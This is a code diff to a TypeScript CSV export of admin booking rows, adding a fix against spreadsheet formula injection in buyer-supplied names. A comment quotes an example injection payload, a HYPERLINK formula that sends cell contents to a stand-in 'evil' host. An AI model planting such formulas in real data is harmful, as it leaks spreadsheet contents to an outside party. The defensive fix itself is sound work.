@@ -88,7 +88,12 @@ function toCsv(rows: AdminBookingRow[]): string {
   ];
   const escapeCsv = (v: string | number | null): string => {
     const s = v === null ? "" : String(v);
-    return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
+    // Neutralise spreadsheet formula injection before quoting. bookerName is
+    // whatever the buyer typed into Stripe Checkout, so a name like
+    // =HYPERLINK("https://evil/"&A1,"click") would execute when the team opens
+    // this export in Excel to pass catering orders to the caterer.
+    const safe = /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;
+    return /[",\n\r]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
   };
   const lines = rows.map((r) =>
     [
